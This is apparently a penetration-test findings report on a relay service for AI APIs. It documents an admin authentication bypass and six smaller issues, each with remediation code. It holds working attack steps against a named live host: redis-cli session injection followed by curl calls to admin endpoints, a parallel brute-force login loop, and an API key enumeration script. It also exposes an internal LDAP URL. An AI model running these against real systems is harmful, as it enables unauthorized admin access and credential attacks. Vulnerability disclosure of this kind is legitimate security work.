# Security Findings - Claude Relay Service

**Date**: 2025-12-28
**Target**: https://claude.chapoly1305.com/
**Version Tested**: 1.1.249

---

## Executive Summary

During security testing, **1 CRITICAL authentication bypass** and **6 informational issues** were discovered.

### CRITICAL: authenticateUserOrAdmin Missing Field Validation

The previous security patch (commit 982cca1) fixed `authenticateAdmin` but **forgot to patch `authenticateUserOrAdmin`**. This allows complete admin access bypass.

**VALIDATED ON LIVE SERVER** - See CVE-level finding below.

---

## CVE-1: authenticateUserOrAdmin Authentication Bypass (CRITICAL)

**Severity**: CRITICAL (CVSSv3 9.8)
**Location**: `src/middleware/auth.js:1569-1581`
**Status**: **VALIDATED ON LIVE SERVER**

### Description

The `authenticateUserOrAdmin` middleware only checks if a session object has any keys (`Object.keys(session).length > 0`) but does NOT validate required fields (`username`, `loginTime`). This is inconsistent with `authenticateAdmin` which was patched at line 1393.

### Root Cause

```javascript
// SECURE - authenticateAdmin (line 1393):
if (!adminSession.username || !adminSession.loginTime) {
  return res.status(401).json({...})  // REJECTS partial session
}

// VULNERABLE - authenticateUserOrAdmin (line 1569):
if (adminSession && Object.keys(adminSession).length > 0) {
  req.admin = {...}  // ACCEPTS any non-empty object!
  return next()
}
```

### Proof of Concept

**Step 1 - Inject partial session into Redis:**
```bash
redis-cli HSET "session:vuln_test_token_12345" "randomField" "test_value"
redis-cli EXPIRE "session:vuln_test_token_12345" 3600
```

**Step 2 - Access admin endpoints:**
```bash
curl -s "https://claude.chapoly1305.com/users/" \
  -H "Authorization: Bearer vuln_test_token_12345"
```

**Response (SHOULD BE 401, BUT RETURNS 200):**
```json
{"success":true,"users":[],"pagination":{"total":0,"page":1,"limit":20,"totalPages":0}}
```

### Validated Endpoints

| Endpoint | Method | Response | Data Exposed |
|----------|--------|----------|--------------|
| `/users/` | GET | 200 OK | User list |
| `/users/stats/overview` | GET | 200 OK | System statistics |
| `/users/admin/ldap-test` | GET | 200 OK | LDAP server URL, config |
| `/users/:id/status` | PATCH | 200 OK | Can modify user status |
| `/users/:id/role` | PATCH | 200 OK | Can escalate privileges |

### LDAP Config Exposed

The bypass exposed sensitive LDAP configuration:
```json
{
  "url": "ldaps://ldap-1.test1.bj.yxops.net:636",
  "searchBase": "dc=example,dc=com",
  "searchFilter": "(uid={{username}})"
}
```

### Attack Requirements

| Requirement | Difficulty | Notes |
|-------------|------------|-------|
| Redis write access | HIGH | Requires network access to Redis |
| Redis auth bypass | MEDIUM | If Redis has no password |
| Corrupted session | LOW | Data integrity issue could trigger |

### Recommended Fix

Apply the same validation as `authenticateAdmin`:

```javascript
// In authenticateUserOrAdmin, after line 1569:
if (adminSession && Object.keys(adminSession).length > 0) {
  // 🔒 ADD: Validate required fields (same as authenticateAdmin line 1393)
  if (!adminSession.username || !adminSession.loginTime) {
    logger.security(`🔒 Corrupted admin session in authenticateUserOrAdmin`)
    await redis.deleteSession(adminToken)
    // Fall through to try user auth instead of granting admin
  } else {
    req.admin = {
      id: adminSession.adminId || `admin_${Date.now()}`,
      username: adminSession.username,
      sessionId: adminToken,
      loginTime: adminSession.loginTime
    }
    req.userType = 'admin'
    return next()
  }
}
```

---

## Informational Findings (Low Priority)

The following are informational issues, not critical vulnerabilities:

| ID | Vulnerability | Severity | Status |
|----|--------------|----------|--------|
| U1 | Information Disclosure via /health | LOW | Validated |
| U2 | Sensitive Data Exposure via /metrics | MEDIUM | Validated |
| U3 | CORS Wildcard Misconfiguration | MEDIUM | Validated |
| U4 | Missing Rate Limiting on Login | HIGH | Validated |
| U5 | Unauthenticated OEM Settings Access | MEDIUM | Validated |
| U6 | API Key Enumeration via /apiStats | HIGH | Validated |

---

## U1: Information Disclosure via /health

**Severity**: LOW
**Endpoint**: `GET /health`
**Authentication Required**: None

### Description
The health endpoint exposes detailed system information including version number, uptime, memory usage, and error counts without any authentication.

### Proof of Concept

**Request**:
```bash
curl -s "https://claude.chapoly1305.com/health"
```

**Response**:
```json
{
  "status": "healthy",
  "version": "1.1.249",
  "uptime": 24371,
  "timestamp": "2025-12-28T09:19:18.893Z",
  "components": {
    "redis": "connected",
    "logger": "active"
  },
  "memory": {
    "heapUsed": 62519712,
    "heapTotal": 103690240,
    "external": 5710953,
    "rss": 150003712
  },
  "errors": {
    "last24h": 0,
    "last1h": 0
  }
}
```

### Impact
- Reveals exact software version (aids in finding known CVEs)
- Exposes server uptime (indicates restart patterns)
- Shows memory usage (potential for memory-based attacks)
- Error counts reveal operational issues

### Recommendation
Require authentication for `/health` or create two endpoints:
- `/health/public` - Returns only `{"status": "healthy"}`
- `/health/detailed` - Requires admin auth, returns full info

---

## U2: Sensitive Data Exposure via /metrics

**Severity**: MEDIUM
**Endpoint**: `GET /metrics`
**Authentication Required**: None

### Description
The metrics endpoint exposes sensitive operational data including the count of API keys and accounts in the system.

### Proof of Concept

**Request**:
```bash
curl -s "https://claude.chapoly1305.com/metrics"
```

**Response**:
```json
{
  "totalApiKeys": 7,
  "totalClaudeAccounts": 1,
  "totalGeminiAccounts": 0,
  "totalOpenaiAccounts": 0,
  "totalOpenaiResponsesAccounts": 0,
  "totalBedrockAccounts": 0,
  "totalAzureOpenaiAccounts": 0,
  "totalDroidAccounts": 0,
  "totalCcrAccounts": 0,
  "uptime": 24466,
  "memoryUsage": {
    "heapUsed": "61.05 MB",
    "heapTotal": "98.89 MB",
    "rss": "143.05 MB"
  },
  "globalUsage": {
    "totalRequests": 0,
    "totalInputTokens": 0,
    "totalOutputTokens": 0
  }
}
```

### Impact
- Reveals infrastructure scale (7 API keys, 1 Claude account)
- Attackers know exact account types in use
- Aids in reconnaissance for targeted attacks
- Zero account types indicate unused features (attack surface mapping)

### Recommendation
Require admin authentication for `/metrics` endpoint.

---

## U3: CORS Wildcard Misconfiguration

**Severity**: MEDIUM
**Affected**: All endpoints
**Authentication Required**: N/A

### Description
The server returns `Access-Control-Allow-Origin: *` which allows any website to make cross-origin requests to the API.

### Proof of Concept

**Request**:
```bash
curl -s -I "https://claude.chapoly1305.com/health" | grep -i "access-control"
```

**Response Headers**:
```
access-control-allow-origin: *
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization, x-api-key, anthropic-version, x-session-hash, ...
```

### Impact
- Any malicious website can make API requests on behalf of authenticated users
- Session tokens or API keys in browser storage can be stolen via XSS
- Enables CSRF-like attacks against authenticated endpoints
- Combined with U4, enables distributed brute force from victim browsers

### Recommendation
Configure CORS to only allow trusted origins:
```javascript
const allowedOrigins = [
  'https://claude.chapoly1305.com',
  'https://admin.chapoly1305.com'
];
app.use(cors({ origin: allowedOrigins, credentials: true }));
```

---

## U4: Missing Rate Limiting on Login

**Severity**: HIGH
**Endpoint**: `POST /web/auth/login`
**Authentication Required**: None

### Description
The login endpoint lacks rate limiting, enabling brute force attacks against admin credentials.

### Proof of Concept

**Request** (repeated 100+ times with no blocking):
```bash
for i in {1..100}; do
  curl -s -X POST "https://claude.chapoly1305.com/web/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"attempt'$i'"}' &
done
wait
```

**Response** (consistent for all attempts):
```json
{
  "success": false,
  "error": "Invalid credentials"
}
```

### Impact
- Unlimited password guessing attempts
- No account lockout mechanism observed
- Automated credential stuffing attacks possible
- Combined with U3 (CORS *), can be launched from victim browsers

### Recommendation
Implement rate limiting:
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { error: 'Too many login attempts, try again later' }
});

app.post('/web/auth/login', loginLimiter, loginHandler);
```

Also consider:
- Account lockout after N failed attempts
- CAPTCHA after 3 failed attempts
- Progressive delays between attempts

---

## U5: Unauthenticated OEM Settings Access

**Severity**: MEDIUM
**Endpoint**: `GET /admin/oem-settings`
**Authentication Required**: None (should require admin)

### Description
The OEM settings endpoint is accessible without authentication, exposing configuration details.

### Proof of Concept

**Request**:
```bash
curl -s "https://claude.chapoly1305.com/admin/oem-settings"
```

**Response**:
```json
{
  "success": true,
  "data": {
    "siteName": "Claude Relay Service",
    "siteDescription": "AI API Relay Service",
    "logoUrl": "",
    "faviconUrl": "",
    "primaryColor": "#6366f1",
    "showPoweredBy": true,
    "customCss": "",
    "customJs": "",
    "footerText": ""
  }
}
```

### Impact
- Reveals branding configuration
- `customJs` field could indicate XSS injection points if writable
- Information useful for phishing attacks (matching site appearance)
- Indicates admin panel functionality exists

### Recommendation
Require admin authentication:
```javascript
router.get('/oem-settings', authenticateAdmin, async (req, res) => {
  // ... existing handler
});
```

---

## U6: API Key Enumeration via /apiStats

**Severity**: HIGH
**Endpoint**: `POST /apiStats/api-key/:keyId`
**Authentication Required**: None (should require admin)

### Description
The API stats endpoints are accessible without authentication and return different error messages for invalid format vs non-existent keys, enabling enumeration of valid API key IDs.

### Proof of Concept

**Test 1 - Invalid format**:
```bash
curl -s -X POST "https://claude.chapoly1305.com/apiStats/api-key/invalid" \
  -H "Content-Type: application/json" \
  -d '{"apiKey":"cr_test123"}'
```

**Response**:
```json
{
  "success": false,
  "error": "Invalid API key format"
}
```

**Test 2 - Valid format, non-existent**:
```bash
curl -s -X POST "https://claude.chapoly1305.com/apiStats/api-key/test123" \
  -H "Content-Type: application/json" \
  -d '{"apiKey":"cr_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}'
```

**Response**:
```json
{
  "success": false,
  "error": "API key not found or unauthorized"
}
```

### Enumeration Attack

The different error messages allow attackers to:
1. Determine valid API key ID format
2. Enumerate existing key IDs by observing response differences
3. Build a list of valid key IDs for targeted attacks

**Enumeration Script**:
```bash
#!/bin/bash
# Enumerate potential API key IDs
for id in $(cat wordlist.txt); do
  response=$(curl -s -X POST "https://claude.chapoly1305.com/apiStats/api-key/$id" \
    -H "Content-Type: application/json" \
    -d '{"apiKey":"cr_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}')

  if [[ "$response" != *"Invalid API key format"* ]]; then
    echo "Potential valid ID: $id"
  fi
done
```

### Impact
- Enumerate all valid API key IDs in the system
- Combined with U4, could enable targeted brute force
- Reveals information about API key naming patterns
- Could identify high-value targets (e.g., "admin", "production")

### Recommendation

1. Require admin authentication:
```javascript
router.post('/api-key/:keyId', authenticateAdmin, async (req, res) => {
  // ... existing handler
});
```

2. Return consistent error messages:
```javascript
// Always return the same error regardless of reason
return res.status(401).json({
  success: false,
  error: "Unauthorized"
});
```

---

## Verification of Previous Patches

The authentication bypass vulnerabilities from commit 982cca1 appear to be properly patched:

**Test - Random token on protected endpoint**:
```bash
curl -s "https://claude.chapoly1305.com/admin/dashboard" \
  -H "Authorization: Bearer random_fake_token_xyz"
```

**Response**:
```json
{
  "success": false,
  "error": "Not authenticated"
}
```

**Status**: 401 Unauthorized (correct behavior)

---

## Remediation Priority

| Priority | ID | Vulnerability | Effort |
|----------|----|--------------| -------|
| 1 | U4 | Missing Rate Limiting | Medium |
| 2 | U6 | API Key Enumeration | Low |
| 3 | U3 | CORS Wildcard | Low |
| 4 | U2 | /metrics Exposure | Low |
| 5 | U5 | OEM Settings Access | Low |
| 6 | U1 | /health Exposure | Low |

---

## Testing Methodology

1. **Reconnaissance**: Identified public endpoints via route analysis
2. **Authentication Testing**: Verified auth bypass patches are working
3. **Information Disclosure**: Tested health/metrics endpoints
4. **Access Control**: Tested admin endpoints without auth
5. **Rate Limiting**: Tested login endpoint with burst requests
6. **Error Analysis**: Compared error messages for enumeration
